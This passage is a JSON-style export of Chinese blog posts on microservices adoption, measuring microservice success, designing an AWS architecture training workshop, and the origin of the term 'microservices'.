团队的主要原因。\n此外，从开发的角度讲，由于一个业务跨多个微服务，我们很难跟踪业务的使用情况。我们所采用的方式是为每一类事物设计状态上下文。包括 id 和错误编码，错误上下文，错误编码根据类别分为：0 正常，正数：服务请求端错误，负数：服务响应端错误，然后根据每个场景设计回滚流程。你也可以通过 HTTP 状态来区分，HTTP 200 就向下传递。HTTP 4XX 或者 5XX 就向上回滚并记录错误信息。这样你就知道是哪个微服务出现了错误。\n另外一个技巧就是把自动化测试当做生产环境的业务监控，我们在生产环境通过运行功能性的自动化测试来验证生产环境业务的正确性。你只需要为它分配一个特殊的账号就可以了。\n我们做微服务最简单的路径一般来说都是先做投入产出的分析，然后可能做前后端的分离，并做到前后端的持续部署。这里的要点是需要采用自动化的方式做好基础设施治理，如果没有 DevOps 的组织这一点就很难。我们通常的做法是给微服务单独开辟一套新的设计，并把微服务团队单独剥离，因为这是两种不同的文化和流程。最后做到全功能的 DevOps 团队和微服务模板，而这些基础设施的自动化是可以复制的。可以为我们批量拆分微服务提供一个很好的开始。\n技术只是一个方面 #微服务的转型往往是一个结果，而不是原因。特别是微服务被当做一个“技术”被引进的时候。然而，技术方案的落地是离不开人的，他是组织和技术相互结合发展的一个结果。如何为微服务的运营提供高效的组织结构？请看下一篇《成功微服务实施的组织演进》\n","date":"December 8, 2018","permalink":"/blog/2018/2018-12-08-microservices-tech-evo/","section":"Blogs","summary":"","title":"成功微服务实施的技术演进"},{"content":" 4 月在深圳的 GOPS 大会上我分享了“落地微服务的难点和如何高效落地微服务”，这是我 2017 年 4 月份开始做的项目总结，后来发表到了自己的博客和\u0026quot; ThoughtWorks 洞见\u0026quot; 上。\n本次介绍的案例来自于我 2013 年刚加入 ThoughtWorks 所服务的客户 R，到今天已经5年整了。2013年的国庆后，我加入了客户 R 的其中一个产品团队，这个团队有三个项目：一个项目做日常维护工作（BAU），这是一个长期项目。一个项目开发一些新的功能。另外一个项目就是将现有的 Java 遗留系统进行改造，把这个 Java 应用的一部分功能从 ESB 和内部调用的方式改成用 Sinatra (Ruby 的一个 Restful API 框架) 做的 HTTP 外部调用。\n当时我还不知道我们做的东西就是微服务，只是觉得通过自动化测试和持续交付的方式把应用进行了低风险的解耦。降低了系统的复杂性，减少了需要维护代码，也使得在这个代码库上工作的其它团队不受阻碍。同时减少了生产环境的故障和发布风险。\n我在这个项目上工作了 8 个月，完成了“一块功能”的拆分。当时我们并没有一个独立的 Ops 团队，所有的运维相关工作都是团队内自己完成的，那时候我们也不区分开发、测试、运维。只是不同的人去认领不同的任务，不会的就现学现用，或者请教Ops 团队。这就是我最早接触的 DevOps ：一个全功能的端到端产品团队。\n在 2014 年的时候我们采用 Docker 进行部署，Docker 在当时是个很新颖的东西，所以互联网上相关的材料并不多。于是我们就自己写了一些编排工具来做 Docker 的大规模部署。同一时期，我们接触到了契约测试，并把契约测试应用于我们的微服务上面。并开始使用 Scala 和 Play 框架拆分另外的应用。通过契约测试，我们会把串行的集成测试转化为一些单元测试。由于契约的约束，使得集成测试降级成为了单元测试，大大提升了测试的效率，降低了测试的成本。\n你会在各种微服务的书和相关实践中都能看到 Pact 这个工具，这是客户 R 的另外一个顾问公司开发的，也是他们定义了什么叫契约测试。到了2014年底我们把几个接口拆分出来之后，我才知道这是微服务，也理解了什么是 DevOps。\n2014 年 11月份我离开了这个团队，开始把在这个团队上的经验推广给不同的客户，才慢慢深入了解了 DevOps 和微服务的概念。同时，客户 R 也开始复制我们之前的成功经验，开始在整个集团内部进行了全面的微服务化改造。\n2017 年 4 月份我重新回到这个客户的项目上工作到 2018 年的 9 月份，期间和其它做微服务的团队进行了一些访谈，可以从比较直观的角度来观察这 5 年来微服务改进的效果和经验。\n本系列共计 4 篇，分别是《我们如何衡量一个微服务实施的成功》，《成功微服务实施的组织演进》，《成功微服务实施的技术技术演进》，《微服务架构演进中的经验和反思》。本场 Chat 是第一篇《我们如何衡量一个微服务实施的成功》，由于保密的原因，具体的客户、项目、人员名称均为化名。\n应用系统的架构的维护成本是如何增长的 #我们采用架构的规模（可以用功能数量或者代码行数来衡量），以及投入的维护成本（人员、资金、时间）来构建一个坐标。就可以做出一个简单的对比：\n在一开始（O点），单体应用的构建成本是相对低廉的，因为并不需要做分布式。而一开始就做微服务的架构，势必会因为分布式的复杂性而产生额外的成本（O1点）。\n随着应用规模的增长，相应的规模就会有相应的维护成本。随着这个规模的上涨，势必会迎来一个 X 点。使得单体应用和微服务应用的维护成本一致。这也说明在这一点之前，单体应用的优势十分突出。\n从架构模型上看，单体应用的规模和维护成本是指数上升的，因为规模所带来的依赖使得风险不断汇聚，导致交付速度降低，部署风险增大。因此，它的维护成本以指数形式增长。然而微服务应用是由多个简单系统组合而成，它的依赖程度较低，单独的交付效率和部署风险可控，因此，他的维护成本以对数形式增长。\n由于微服务的这种特性，当两种应用架构的规模超过X点之后，它们的维护成本则相去甚远，势必会迎来一个维护成本的极限 X\u0026rsquo; 点，从而约束了应用规模的极限。\n而在这个情况下，就是大多数企业转型微服务的驱动力：原先的应用增长模式无法应对规模的增长。\n所以，我们可以看到，大多数的企业是从 O 点出发，沿着红线走到 X\u0026rsquo; 点，然后开始进行微服务的改造。以换取应用的增长规模。\n而一开始做微服务架构的应用，虽然在开始的阶段投入了更多的成本，但换取的是未来更大的规模。不过，从精益的角度看，这是一种浪费，除非你的目标就定位了一个大规模的应用。这在大多数应用系统最初建立的时候都是不可能预期的。\n所以，一条理想的模型是从 O点出发，到达 X 点之后进行微服务改造。\n然而，这根本不可能实现，原因有两点：\n人们不会同时构建两个一样的应用来做比较，从而找到增长极限。 目前，也不会构建一个度量指标，来度量维护成本和应用规模。 所以，你所处的阶段，应该是 X 到 X\u0026rsquo; 之间的某一点，你开始采用 DevOps 技术来缩短研发周期，提升交付质量，也开始度量应用的交付状态。这就需要我们构建一个指标来度量架构，这就是：边际功能收益率（MSROI，Margin Scale Return on Investment ），也就是我创建一个新的功能，它在未来一段时期所消耗成本（人力、时间、资源）所带来的回报（降低成本，降低风险，增加收益等）。如果这个收益率持续降低，且是因为成本在不断增加，你就需要考虑是不是降低应用维护的成本了。\n应用架构的局部性原理 #事实上，一个正在运行的系统，维护过程会有两个局部性原理。我把它称为应用系统的 DevOps 局部性原理假设，它包含 Dev 和 Ops 的两个局部性假设。分别是：\n开发局部性假设：在运行着的应用系统中，维护所做的工作是对应用系统的局部进行开发。因此，对整个开发团队应该只产生局部性的影响。 运维局部性假设：在运行着的应用系统中，由于局部的变更，应该只产生局部性的风险和影响。\n以上两个假设有一个约束：由于局部性的开发导致的综合成本。均小于替换整个系统的整体成本。\n也就是说，你所构建的局部性是要小于你原先系统规模的，否则你就是实现了一个新的系统。\n但我们所经历的事实是相反的：一个局部性的变更需要依赖很多其它的开发团队和人员，并在应用系统中产生连锁规模的影响。\n所以，如果你的应用系统是微服务的架构，就会符合上述的微服务 DevOps 假说并通过微服务的 DevOps局部性测试：\n任意应用的局部变更均产生局部性的影响。\n为了降低系统风险，我们需要将应用的变更风险隔离出来。因此，就有了微服务架构的 DevOps 推论：\n运行时的维护关注点局部性使得独立开发的局部性成为可能。\n也就是说，在应用运行架构风险隔离的情况下，才可能出现独立开发和独立部署。而本质上，单体应用到微服务应用的转型就是应用的内部的高风险依赖转化为外部的低风险依赖的过程。是内部复杂度向外部复杂度的转换。因此，微服务架构改造所花费的成本大部分都在处理服务间的通信。\n应用系统的 DevOps 局部性原理假设的角度看，微服务本质上的目标和 DevOps 的目标是一致的。这也符合我此前做微服务的落地经验：当应用程序的部署时间和变更风险在单一应用上做到极致之后。我们可以考虑对应用进行拆分以进一步实践 DevOps。\n也就是说，微服务架构是组织 DevOps 不断深入和优化的结果。\n我们如何衡量一个微服务的转型效果 #我们做微服务的主要诉求就是希望系统规模在增长的同时，管理成本降低。也就是应用结构和组织结构满足上述的假设。这个管理成本包括两个方面：\n人员的管理成本降低。由于通过制度构建了扁平化和全功能的团队，组织间的沟通协调成本下降。 技术的管理成本降低。由于采用了松耦合的架构策略，使得应用架构既稳定又灵活。可以低成本、低风险清理技术债，修复问题。或者增加新的功能。 人员的管理成本降低 #当业务扩张的时候，需要开发并维护更多的需求。因此，在时间和质量不变的情况下，只能通过增加资源来满足需求。但是，边际收益递减规律告诉我们：在其它条件不变的情况下，任何单一要素的投入所带来的收益是会递减的。因此，需要增加额外的要素来获得增长和回报率，特别是调整组织的结构，降低来提升容量。\n而在大型应用系统开发面前，我们投入资源的只有人，因此我们可以看到。大型的项目随着人员的增加，它所带来的管理成本也会增加，直到增加人员不产生收益为止。这是我们在大型应用系统，特别是互联网应用上看到的问题。\n以前粗放式的通过把复杂问题分解，并且通过人海战术开发需求的模式将不可持续。一方面，复杂度的提升，需要能够把问题合理拆解到合理规模的架构师，这样的架构师获得成本较高，无论是招聘还是培训。另一方面，随着开发维护人员的增加，人员的管理会增加额外的成本。\n然而，微服务的出现。改变了应用架构，并在依据康威定律的作用下，改变了组织形式。通过自组织的全功能敏捷团队，简化了交付的流程的沟通成本。通过采用自动化手段将最佳实践制度化，提升了交付质量，降低了培训的成本。通过把一个问题分解为独立的问题，避免界限不清带来的额外成本。\n从经济学角度说，微服务组织结构本身包含产权制度和界定产权两个部分。\n如果你的微服务做得最够好，根据康威定律，你的架构会和你的组织结构是一致的。如果你有了一个自治且自我成长的团队后，通过把最佳实践变成制度和规则充分授权，而不需要更多的请示和汇报，你的组织结构不会有一个很厚很高的层次以及对应的回报关系。而是扁平而松散的结构，每个团队按照同样的制度独立完成任务，不会出现组织流程上的阻塞。但能够达到同样的质量效率。\n而这样的文化最后最后会形成一个开发软件的文化和制度，这个制度可以在组织内复制并且推广延续。减少了更多的人工管理成本。\n因此，微服务架构能够大幅度的降低组织的管理成本。我们可以看到团队自我改进、人员能力提升，你可以有更少的管理层，在 2018 年北京 DevOpsDays 上华为 DevCloud 团队的案例分享也证明了这一点。\n因此，一个成功的微服务实施，我们可以看到以下几点组织特征：\n组织结构的扁平化，更少的管理层。意味着更低的管理成本。 组织的弹性更好，抗风险能力更佳。任何人的离开都不会带来很大的影响。 交付质量和产出高，至少每天一次的高质量发布使得任何变更都不会出现阻塞。 培训成本降低，统一了原则和文化，使得任何新人进入团队都可以快速上手。（2个迭代就有产出） 没有阻塞，团队独立并且实时监控组织产能情况，可以动态的调整资源和产量。 技术的管理成本降低 #另一个微服务成功的特征就是技术管理成本的降低，这个有两个方面的成本。一方面是开发成本，另一方面是维护成本。\n主要原因是在单体应用的时代，在变更请求频繁的情况下，单体应用成为了一个互斥资源。借用 DevOps 和约束理论（ToC）的话说，单体应用的代码库成为了一个约束点。在这个代码库上的所有变更都需要精心的安排和设计，否则会带来整体影响。架构师需要仔细研究推敲各个方面，才可以综合因素做下一阶段的安排。这时候，我们需要对于应用架构的变更进行“批处理”。如果一批变更太多，一个变更失败就会导致一批失败。因此，业界开始采用\u0026quot;小步快跑\u0026quot;的方式频繁的发布，减少失败率。为了达到这个目的，就有了“持续交付”以及 DevOps 相关的实践。\n因此，我们需要通过一定的方法解除约束点。由于上文提到的应用程序的 DevOps 假设及其推论。我们可以把应用程序拆分成边界清晰的不同部分，用不同的代码库管理，并由不同的团队去维护。从而达到开发运维的局部性，用以实施持续交付。\n这样做有几个好处：\n首先，你会得到一个清晰的架构。而我们现在大部分系统的应用架构是混乱的，里面存在了太多的“暗知识”。“暗知识”就是需要通过跟踪代码，跟踪日志，实际运行监测的到的不确定的知识。现在我们去画一个系统的架构分层图，你画出来的图跟实际系统对应程度并不是很高，而且很混乱，往往出现的情况是部署架构和逻辑架构不一致。\n其次，你会得到更快、更稳定的发布反馈。这实际上是 DevOps 带来的好处。使得你可以更频繁的去部署应用，在部署和更新的时候应用更稳定，存在更少的宕机时间。在这个过程中会发现有很多的自动化，然后随着微服务做得越来越多。最大的问题就是面对微服务的管理。实际上，在外部需求功能不变的情况下，微服务的大小决定了微服务的数量。同样也决定了团队的数量和管理的复杂度。所以，微服务的大小不是问题，问题是你有多少人员能够支撑这样的复杂度。\n我们知道如果你的开发任务量在增加的时候，我们在不增加资金投入，不增加开发时间的情况下的情况下能做到最好的方式就是减少满足你最终交付时间点的需求。但是到了微服务的环境下，你不需要再有这样的到期时间点交付的任务，你发现不需要增加人同样可以解决这些问题。\n当你发现需要管理这么多微服务你需要额外的自动化，你的团队里就会自驱形成自动化的意识。\n然而，自动化带来的不仅仅是效率和稳定性。\n通过持续交付流水线，我们把功能测试和非功能测试都自动化起来，并且集成到持续交付流水线里。\n这样，我们就把提升质量作为一种制度贯彻下去，避免人为质量管理带来的疏漏和质量下降。\n记住，频繁发布的前提是不断提升质量。如果降低对质量的要求，持续交付就只剩频繁发布了。所谓“质量不能降，一降就走样”。\n有了高质量作为发布门禁和要求，我们就会看到团队会向这个标准努力并提升自己的能力。发布的风险和带来的影响会越来越小。\n任何让你缺乏信心的发布都有一个质量忙点，问题是，有多少人会愿意制度化的方式去解决，而不依赖人和测试。\n因此，从技术上看，我们可以看到一个成功的微服务实施具备以下几点特征：\n很多个代码库，以及一一对应的流水线。 应用可以随时部署，并不需要等待。 大量的自动化测试。 更少的变更事故。 更低的发布风险。 可以按需扩展。 更多的自动化手段。 最后 #当我们知道如何度量微服务的效果之后，我们就可以拿这个参考来考察一下微服务的组织实践和技术实践是否有助于我们达到以上的效果。接下来，我们会通过对比该微服务化架构组织和技术的异同来说明微服务所带来的转变。请期待下一篇：《成功微服务实施的技术演进》\n","date":"November 8, 2018","permalink":"/blog/2018/2018-11-08-how-do-we-measure-microservices-success/","section":"Blogs","summary":"","title":"我们如何衡量微服务的成功？"},{"content":"","date":null,"permalink":"/tags/aws/","section":"Tags","summary":"","title":"AWS"},{"content":"背景 #2017 年的年末，我在 REA Asia 团队担任 DevOps 工程师的角色。当时刚刚完成一个站点 AWS 端到端的上线，这也是我第一次完整的从零独立设计完成一个 AWS 上 Web 的架构设计以及自动化实现。这也使得我能够亲自实践如何从零设计和实现一个兼具安全和稳定，并且 DevOps 友好的应用架构。于是我十分想把过程中遇到的体会和心得能够记录下来。\n偶然在 To China 邮件列表里看到了三周三页面工作坊成功结束的消息。于是我想，何不把我过去所做的内容分解一下，变成四周四架构？\n学习的假象和真相 #2016年，我在武汉 Office 出差，当时因为学习了 Coursera 上的 “Learning How To Learn” 课程，了解了很多关于大脑科学，和学习心理学的知识。为了更好的掌握这些知识，现学现卖，在武汉 Office 开设了两期的 “高效学习” 工作坊。\n两期工作坊一方面验证了书上包括 “Learning How To Learn” 视频上讲的理论，也让我如何在设计课程中有了更多的灵感和经验。当然，每一期学习者都会成为我学习心理学实验中的“小白鼠”，当然这是后话。但这也是我逐步开始研究人和人之间学习能力差异性的开始。\n随着自己的体验和工作坊的开展，我发现了以下两个常见的学习假象和真相：\n假象：学习，只需要买书，看视频，在网上找文档就可以了 #真相：学习是一个很艰难的过程，找一个好的教练，效果事半功倍 #如果我们设定一个学习目标，而且我们有验证和度量这个学习目标的方式。从起点到终点，有无数条路径。对于已知的知识来说。最慢的路径就是看书，其次是视频。如果你不是一个长期自学并且严于律己的人，达到学习目标是一个漫长而又痛苦的过程。想想那些你的计划，和执行。这也就是为什么达到健身效果的最有效方式是找一个教练：他最重要的职责是在你容易放弃的时候帮助坚持下来。\n一方面，有可能是因为学习过程本身困难，压力很大。另一方面，就是会有其它的事情阻碍你的专注。因此，达到学习目标最快速的途径就是找到好的教练，制定适合你自己的学习课程，按部就班的完成内容的练习和检测。\n假象：完成课程，就学会了相应的技能 #真相：只有你能够教别人，才是完全掌握了 #“蔡加尼克效应”，是一种记忆效应，简单的来说，就是你不会记得已经完成的事情，而是一直记得未完成的事情。也就是说，当你完成了学习过程，你会忘记之前学过的内容，因为它对你的重要性已经不强了。这点很容易理解，尽管你高中大学很多课当时考了高分，但现在让你再考，你会忘记当初学习的内容。因为，学习的目的是为了考试和分数，当考试和分数这个压力没有了，你自然会把内容忘记。\n我自己的亲身经历也能提供证据，在我刚加入 ThoughtWorks 的第一年的14个月里，我一口气完成了 Coursera 的 9 门在线课程的认证。然而现在让我回想起来，记住的并不多，因为缺乏实践和使用，它们随着我回收的神经细胞一起回收了。\n因此，不断的复习，并且通过教别人的方式复习是最有效的验证和巩固方式，你不光能够在准备内容的时候巩固自己所学。也可以在和学员的交流中发现自己需要补充的知识。\n现有课程的问题 #很多的课程以在线材料的方式出现，包括视频课程，在线文字课程。这种方式的缺点在于只有输出，学习者是否获得了对应的知识和技能是无法验证的。它们并不是一个“学习体验旅程”，而是学习体验中的元素。学习体验旅程的中心是学习者。如何围绕学习者构造的，而不是内容输出者。\n如何验证学习的效果？ #在线课程无法证明你“掌握”了，但可以证明你“了解”了。当然，这个“了解”，一定程度上处于学习者的主观判断。而一场考试则是考验你是否“记忆”了。对于在线课程来说，只能确保输出，但很难确保输入。\n因为存在两个问题：\n一方面就是我们无法控制学习者的状态，无法及时的给学习者帮助和反馈。另一个方面就是学习者掌握的内容如何确认学习者真的掌握了，或者能够验证掌握的程度？\n因此，课程一定要设计出能够帮助学习者自身度量自己掌握程度的验证方式，目前比较好的量化效果，就是考试。\n如何验证学习的价值？ #这个课程给学习者带来的价值是什么？对于学习者来说课程往往是一个 0 到 1 的过程，而从 1 到 100 则需要个人的精进。而且，每个人的诉求并不相同，如何保证每个人都有所得，就需要设定好学习者期望。\n所以，提供的价值对于学习者来说很有限，但如果养成了良好的习惯或者正确的认识，则能加速个人 1 到 100 的过程。因此，课程的设计一定要能够做到以下两点：\n针对特定学习者，内容能够由浅入深，并且可以度量。 提供由浅入深中“不变”的那个部分的专项训练。 在召集学员的时候明确以上两点。 因此，课程做到保证“师父领进门”，而“修行在个人”就只能靠学员平时在工作中对学习内容的应用了。\n设计一个 MVP #根据以上我的经验，再加上“精益创业”的熏陶，我就开始进行第一个 MVP 的设计和实践。\n首先采用逆向工作法，从学习者的可度量结果出发，反向推导应该设计什么样的内容，以及如何掌握。利用“蔡加尼克效应”，让工作坊的内容在课堂上完成不了，利用持续性的压力迫使学习者不断在脑中复习。通过学习者的反馈进行不断的调整。\n既然叫做四周四架构，目的就是要四周的时间在 AWS 上搭建四种不同的应用架构，从最简单的应用开始，逐步增加内容。并用实际的场景驱动架构的演进。\nMVP 的用户是没有 AWS 经验或者 AWS 经验尚浅的 Developer，使他们在学习之后能够达到以下效果：\n了解在 AWS 上端到端构建应用的过程。 学会 AWS 上常用服务的使用要点。 实际构建 CI 服务器并亲自完成 CD 过程。 了解基础设施即代码并自动化以上三点内容。 对实际的工作产生积极的作用。 我邀请了我的 Sponsee 赵朝朝和张冬毅帮我提供了知识体系的内容。整个工作坊包括以下三方面内容：\n基础的 Ops 知识：网络、安全、CDN、操作系统、命令、脚本等。 AWS 的组件知识：通过一个端到端的应用搭建，了解每一个 AWS 服务组件的用法。 真实环境下的最佳实践：基础设施即代码，CI/CD，基础设施流水线，技术雷达相关条目等。 并且，从“安全第一”的角度下对每个课程进行设计，启发学习者对安全问题的思考。所以根据我自己的经验，我进行了如下的设计\n工作坊的设计有以下几个原则：\n安全：每个实践都会首先从安全的角度考虑。（Security In Our DNA） 自动化：从第一周开始到最后一周都是采用基础设施即代码自动化完成。 最佳实践：考虑常见场景，并讨论最优解决方案。 技术雷达：本课程采用了最新一期技术雷达的相关工具和技术。 作业实践：每次课程都留有作业，根据时间分为小作业（平均6个小时）和大作业（平均10个小时）。 提升自学能力：在工作坊中通过 Lightning Talk 分享知识点，通过分享和反思提升自学能力和团队学习能力。参与本工作坊的学习者要成为下未来工作坊的 Coach，”以教为学“，通过教来检验自己的学习和掌握成果，并巩固复习其中的知识。 AWS 组件和服务： 管理类：CloudWatch, CloudFormation 安全类：IAM，KMS, Certificate Manager 网络和内容类：Route 53，Cloudfront，VPC, Subnet，Internet Gateway, Security Group，API Gateway 计算类：EC2, ELB, AutoScaling Group, LaunchConfiguration，Lambda 存储类：S3 数据库：RDS，DynamoDB\n工具： SaaS 服务类：cloudping.info, cloudcraft.co, flood.io 运维工具类：ansible, docker, crontab 应用工具类：hexo, jenkins, wordpress, serverless framework\n工作坊所用到场景实践和工具：\n基础设施即代码 基础设施流水线（请参考 第 17 期技术雷达） Flood.io 负载测试 （请参考 第 17 期技术雷达） 数据库的备份和恢复 自动化水平扩展 第一次获取反馈 —— 第 0 期学习者 #最开始的时候我召集了几个熟识的同事，包括同一组的同事。运用每周二、四的晚上 2 ~ 3 个小时来进行分享和理解。同时布置作业，所以每堂课分成4个部分：\n作业点评 - 30 分钟：除了第一次课外， 学习者 Session - 30分钟：学习者 Pair 或者独立完成一个 Session，Session 的 题目除了布置的内容以外。更多的是课堂上产生的问题。例如 HTTPS 的原理，加密解密，基本的网络知识 本次内容和本次作业 - 30 分钟：25分钟用来讲解本次的内容，5分钟用来留作业。 收集反馈 - 30分钟：收集学习者的反馈。 MVP 需要验证以下问题：\n时间是否足够 难度是否适当 作业占用学习者的精力的多少 布置的 Session 是否达到效果 验证 AWS 支出会有多少 首先，我挑选了一些学习者。看看对 AWS 熟悉程度不同的学习者对课程内容难度的消化情况。其中，2名零基础学习者，2名有一点 AWS 使用经验的 Dev，以及开始或者正在 AWS 上做 Ops 的学习者。\n其次，采用“目标驱动的自学”，并采用 Session 和作业的方式进行验证，使得学习者通过多感官刺激记忆住学习的内容。并在过程中，借由驱动自己解决新出现的问题来提升自己的学习能力和效果。\n最后，利用“蔡加尼克效应”持续不断的在学习者的大脑中增加“未完成”的印象，使得这种压力和记忆有足够的时间来留下学习印象。\n通过第一次的实践，我获得了如下结果：\n内容太多，Workshop 内的时间并不充裕。第一期完成的时间比预期（4周）要多，内容进行了 80% 花费了7 周的时间。 难度偏高，除了课时内容，需要每天占用至少 2 小时来完成作业。如果增加学习压力的话，效果未必好，疲劳度会提升，影响工作和进一步学习。 学习者自己讲的 Session 能够很好的传递积累和学习知识。 工作坊的支出在 78 元附近，包含一个自己的域名（9 美元），采用 Free Tier 政策则能省下更多。 获得了以上的结果后，我就开始准备第一期学习者的招募计划。\n第二次获取反馈 —— 第 1 期 学习者 #当第0期还未结束之际，我就开始招募第一期的学习者，为了保证效果，限定10名学习者（面向 Office，从不同的5个项目组依据性别比例随机选择2名）。此外，加上我所在团队的成员，共有20人报名。\n根据第一期的经验，同时删减第一期的内容，减少作业量，\n第一期学习者需要验证以下几点：\n什么样程度的学习者对这个课程感兴趣？ 调整过的内容是否合适？ “蔡加尼克效应”对 0 期学习者的影响是否有效？ 0 期学习者是否能够采用教别人的方式完成知识的巩固？ 学习完成后给项目和自己能给自己带来多少真实的提高？ 邀请 0 期的学习者成为第 1 期的 Coach 有两个动因：一方面是验证蔡加尼克效应的真实效果，另一方面是巩固第 0 期所学的知识。\n在过程中，根据学习者的反馈，对课程的设置及时进行调整。分别增加了一次作业讲解，为了让大家更加熟悉基础设施即代码。此外，为了阶段性巩固学习成果，将第六周改为了一次“期中考试”，以巩固之前所学。期中考试的结果还是反映了一些问题的，于是在这一期课程进入尾声的时候，我增加了期末考试。并且计划将期末考试的时间推迟两个月左右，来看看考试效果。\n针对整个学习的内容，我把考试分为了笔试和上机两个部分。主要目的是能够运用 AWS 服务完成一个应用端到端架构的基本原理，次要目的是检测学习者对学习内容掌握的清晰程度。因此，笔试部分为 40 道不定项选择题，每题 1 分。这种题目的要求比较高，只有清晰掌握了知识，才可以做全对。40道题里的难度设置为：10 分“送分题”，关于工作坊所学内容的一般性常识，10 分基础题，只要参加工作坊完成过作业就可以答对的题。10 题难题，答案中有所混淆，十分熟练才可以大队。10题陷阱题，目的是为了矫正认知，所以基本上一定会做错。\n上机部分以第 3 周，也就是工作坊中最难的架构为场景，设计了12个考点，每题 5分，共 60 分。 简单，中等，困难各 4 道。简单题目就是直接指出在 AWS 中要完成的事情，再一次巩固学习内容。中等题目是设定一定目标，提示 AWS 组件，而完成的内容需要自己来实现。困难题目只是表明目标和检测方法，没有任何提示。这样从分数上来说，就可以收集到学习者的结果和课程设计期望之间的差距，以便下一期设计好课程。\n在进行正式考试之前，我分别找了两位同学进行“试考”，以确保题目正确并达到想要的效果，避免出错题。\n通过第1次的实践，我获得了如下结果：\n这个 MVP 依然很大，将学习时间碎片化并不利于对内容的掌握。学习内容对于目标的完成来说并不利。 吸引到的学习者都不是专业做 Ops 工作的，知识结构上存在短板，但和 AWS 有一定交集，并没有经过系统的学习。 人数必须在10人以内，否则时间会被分散，不利于集中使用，难以达到预期的效果。 内容很紧凑，如果中间有一次没有来，之后来的可能性很低。 课程时间太少，作业完成程度不高，加之缺乏练习，遗忘很快。“蔡加尼克效应”此处失败，在于学习者对这件事情的重视程度上。 AWS 零基础或者具备基本经验 Session 占用的课上时间会导致拖堂。如果按时结束，则内容则完成不了。 Lambda 的部分所需要的时间比预期的更加长，而且场景有点复杂。 考试是非常有效的验证学习结果的方式。 通过考试发现，对内容的掌握程度和自己的已有知识关系很大。也就是说，分数高的学习者，工作中也在做类似的工作。分数低的学习者，学习内容能给她带来的作用很有限。 即将推出的 AWS 四阶工作坊 #第 1 期开始的过程中，我不断在度量和总结，并且依据反馈及时调整了课程的设置以及内容的增减，以改进这门课的设计。接下来的第 2 期课程，会有以下变化。\n增加了课时：每一个架构都由 16 个学时构成，按照 2 天 * 8 小时的方式计算， 4 周 总计需要 64 个学时。这 64 个学时可以自由安排：可以是一周内的5个工作日，也可以是两个周六周日，也可以是四个周六或者周日。这样课程可以满足更多场景的需要。因此，这个工作坊就不能再叫 4 周 4 AWS 架构了。我把内容再次切割成更加轻量级的单元，学习的压力更小，效果更佳。\n此外，在设计考试的时候这让我想到了考驾照。于是，我重新修订了目标和课程名称。将四周四 AWS 架构 改称为“ AWS 技能水平资格认证”（以下简称 “AWS 老司机驾照”），把原先的 4 周 4 AWS 架构变成科目一，科目二，即将增加的中高级内容（正在开发）则放到科目三和科目四中。\n我把原先的 4 周四架构拆成 两个部分，Serverless 部分单独成为一个两天的工作坊，暂时剥离 AWS 老司机。剩下的内容再次删减成两个部分，一部分是简单的 EC2 Server 的设计和使用，重要强调基础设施即代码能力（一阶），用两天的时间完成。另一部分是真实的 Web 应用场景，把独，CDN，VPC 规划 和 RDS 放到另外两天的课程（二阶）。\n第二期的设计如下：\n重新定位的学习者目标：巩固 AWS 的每一个应用架构的场景和知识。 更小的学习压力，更容易的输出和度量。 采用周末一天或者两天，全天的方式，集中的完成一个内容。 更多的课堂指导实践的机会，当堂消化内容。 每一次一定会有上一次的内容相关的考试，通过反馈来校正和巩固自己的学习效果。 这一次的效果和反馈如何呢？期待你的加入和分享。\n与此同时， “AWS 老司机驾照” 的科目三和科目四正在开发中。目前的计划是采用 Terraform 构建一个 Kubernetes 集群，并且引入 Spinnaker 作为流水线，部署一个 微服务架构的应用并引入 Chaos Monkeys 做可用性验证。全程会采用技术雷达推荐的实践和工具，并且同样结合真实的项目场景进行驱动。\n","date":"September 27, 2018","permalink":"/blog/2018/2018-09-27-about-4-weeks-4-aws-architect/","section":"Blogs","summary":"","title":"关于四周四 AWS 架构工作坊的设计和实践"},{"content":"关于“什么是微服务”的问题，其实并没有一个统一的认识。这些年在不同的场合里和不同背景的朋友都在探讨微服务。但聊得越多，就越发现大家聊的不是同一回事。和 DevOps 一样，“微服务”也是一个内涵十分广泛的词。本文从“Microservice“这个概念的源头出发，总结了 4 个常用的微服务定义。\nJames Lewis 原始版的微服务 6 大特征 #这个版本起源于2012年，这里首先要注意年份，那时候还没有 Docker，而且 Netflix 的微服务化过程也在这个概念提出之前——2008年就开始了，那时候甚至连 DevOps 还没发明出来。James Lewis 在波兰第 33 次 Degree in Kraków 会议上分享了一个案例，名称是 “Micro Services - Java, the Unix Way”。在这个分享里， James Lewis 分享了在 2011 年中参与的一个项目中所采用的一系列实践，以 UNIX 的哲学重新看待企业级 Java 应用程序，并且把其中的一部分称之为“ Micro-Services ”。\n这个时候的微服务所用的单词和我们现在所用的 Microservices 这个单词有所不同。一方面，采用 Micro 作为形容词，是和 Monolithic 相对，而不是和 Macro 相对是源于操作系统这门大学课程。我们知道，现代的操作系统课程都是以 UNIX 作为案例进行讲解的。而这两个单词来自于“微内核”（Micro-Kernel）和“宏内核”（Monolithic kernel）的比较。而非常见的“微观经济学”和“宏观经济学”中的 Micro 和 Macro 两个相对应的单词。\n另一方面，服务要以复数形式出现，表示的是一个以上。由于汉语里单复数是同型的，所以我们在翻译的时候会出现问题。因此，“微服务”在作为架构的形式出现的时候，我们会用“微服务架构”称呼。单个的微服务从概念上为了和 SOA 以及其它领域的“服务”有所区分，会以“单个微服务”以示区别。而”微服务“单独拿出来是被看作为一系列技术实践的总称。\n在这个分享里，James Lewis将所实践的“微服务架构”总结为 5 大特征：\nSmall with a single responsibility —— “小到只有单一原则”\n在这个特征里，关于微服务有多小有两个标准：\n第一个标准是：如果一个类复杂的超过一个开发人员的理解范围，那么它就太大了，需要被继续拆分。\n第二个标准是：如果它小到可以随时丢弃并重写，而不是继续维护遗留代码，那么它就足够小。这个标准有个很重要的原则就是 Rewrite over Maintain，即“重写胜于维护”。\nContainerless and installed as well behaved Unix services —— “去容器化并且作为 Unix Service 安装”\n在这个特征中，James Lewis 提倡采用 Jetty 这样的工具集成到 Maven 里，可以很方便的调试或者部署。然后打包成一个可执行的 JAR 包并以 UNIX 守护进程的方式在系统启动时执行。\n特别是在 AWS 这样的公有云环境下，把这样的应用程序和虚拟机实例的初始化脚本结合在一起。使得应用程序的生命周期和虚拟机的生命周期绑定成为一体，由于守护进程在所有 Unix 系统中都是通用的，因此简化整体架构的开发和运维。\nLocated in different VCS roots ——“分布在不同的版本控制代码库里”\n在这个特征中，James Lewis 